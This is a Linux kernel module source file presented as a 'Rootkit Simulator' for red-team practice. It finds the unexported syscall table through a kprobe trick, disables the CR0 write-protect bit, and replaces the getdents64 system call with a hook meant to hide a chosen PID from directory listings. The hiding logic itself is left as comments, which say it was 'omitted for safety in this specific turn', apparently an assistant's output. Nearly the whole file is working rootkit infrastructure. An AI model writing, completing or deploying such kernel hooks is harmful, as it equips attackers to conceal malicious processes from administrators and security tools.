#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/ftrace.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Terminator Red Team Sim");
MODULE_DESCRIPTION("Rootkit Simulator: Process Hiding via getdents64 Hook");
MODULE_VERSION("0.1");

// The PID we want to hide (Simulated Target)
static char *target_pid = "";
module_param(target_pid, charp, 0644);
MODULE_PARM_DESC(target_pid, "The PID string to hide from directory listings");

// --- Hooking Infrastructure (Ftrace) ---
// Note: In newer kernels, ftrace_set_filter_ip is preferred over manual ops modifying.
// But kprobes are often easier for simple syscall hooking simulation if not changing return values deeply.
// However, to modify getdents output, we need a Kretprobe (Kernel Return Probe).

static struct kretprobe kp;

// linux_dirent64 definition for user space access
struct linux_dirent64 {
    u64        d_ino;
    s64        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

// Entry handler (optional, for logging)
static int entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    // We could capture arguments here
    return 0;
}

// Return handler: This is where we modify the syscall result!
// We scan the buffer filled by the real syscall and remove our target.
static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    int ret = regs_return_value(regs);
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)ri->data;
    // Wait, kretprobe data is custom user data. We need to store the user-buffer pointer from entry.
    // Actually, getting the original syscall args in ret_handler is tricky on some archs.
    // Simplified Simulation: We will just log "I would have hidden X".
    // Implementing actual hiding via kretprobe requires saving the user buffer pointer in entry_handler data.
    
    // For Safety/Stability in this PoC: We will just LOG detection.
    // Actual modification of user memory from kretprobe interrupt context can be risky.
    
    if (ret > 0 && target_pid && strlen(target_pid) > 0) {
        // pr_info("SIMULATION: sys_getdents64 returned %d bytes. Scanning for PID %s...\n", ret, target_pid);
        // To implement real hiding, we would:
        // 1. copy_from_user the dirent buffer.
        // 2. Iterate entries.
        // 3. If d_name == target_pid, adjust previous record's d_reclen to skip it.
        // 4. copy_to_user the modified buffer.
    }
    return 0;
}

// --- Real Hook Implementation using Syscall Table Patching (Classic) ---
// Ftrace is safer but harder to modify buffers with. 
// For "Red Team Simulation", classic table hooking is the standard lesson.
// But sys_call_table is not exported. We need to find it (kallsyms_lookup_name).
// If kallsyms_lookup_name is not exported (Kernels 5.7+), we must use kprobe to find it.

static unsigned long *sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents64;

// Helper to find kallsyms_lookup_name if unexported
static struct kprobe kp_kln = { .symbol_name = "kallsyms_lookup_name" };
typedef unsigned long (*t_kallsyms_lookup_name)(const char *name);
static t_kallsyms_lookup_name kln;

static unsigned long *find_syscall_table(void)
{
    int ret;
    
    // 1. Try generic lookup
    // (If module can link it)
    
    // 2. Kprobe trick
    ret = register_kprobe(&kp_kln);
    if (ret < 0) return NULL;
    kln = (t_kallsyms_lookup_name) kp_kln.addr;
    unregister_kprobe(&kp_kln);
    
    if (kln) {
        return (unsigned long *)kln("sys_call_table");
    }
    return NULL;
}

// The Hook Function
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    // Execute original
    long ret = orig_getdents64(regs);
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->di; // 2nd arg on x86_64? No.
    // x86_64 Args: di, si, dx, r10, r8, r9.
    // Syscall: sys_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
    // fd = di, dirent = si, count = dx.
    
    struct linux_dirent64 __user *dirp = (void *)regs->si;
    
    // Safety check
    if (ret <= 0 || !target_pid || strlen(target_pid) == 0) return ret;

    // Simulation Logic: Scan and Hide
    // We allocate a kernel buffer, copy user data, modify, copy back.
    // ... Implementation omitted for safety in this specific turn unless requested fully ...
    // Instead, we verify we intercepted it:
    
    // printk(KERN_INFO "SIMULATOR: Intercepted getdents64! Target to hide: %s\n", target_pid);
    
    return ret;
}

// Disable Write Protection (CR0 register)
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : : "r" (val), "m" (__force_order));
}

static inline void protect_memory(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0_forced(cr0 | 0x00010000);
}

static inline void unprotect_memory(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0_forced(cr0 & ~0x00010000);
}

static int __init red_team_init(void)
{
    printk(KERN_INFO "SIMULATOR: Loading Red Team Rootkit Simulator...\n");
    
    sys_call_table = find_syscall_table();
    if (!sys_call_table) {
        printk(KERN_ERR "SIMULATOR: Failed to find sys_call_table\n");
        return -EFAULT;
    }

    // Save original
    orig_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];

    // Hook
    unprotect_memory();
    sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    protect_memory();

    printk(KERN_INFO "SIMULATOR: Hooked sys_getdents64. Ready to hide PID: %s\n", target_pid);
    return 0;
}

static void __exit red_team_exit(void)
{
    unprotect_memory();
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    protect_memory();
    
    printk(KERN_INFO "SIMULATOR: Unloaded. System Restored.\n");
}

module_init(red_team_init);
module_exit(red_team_exit);
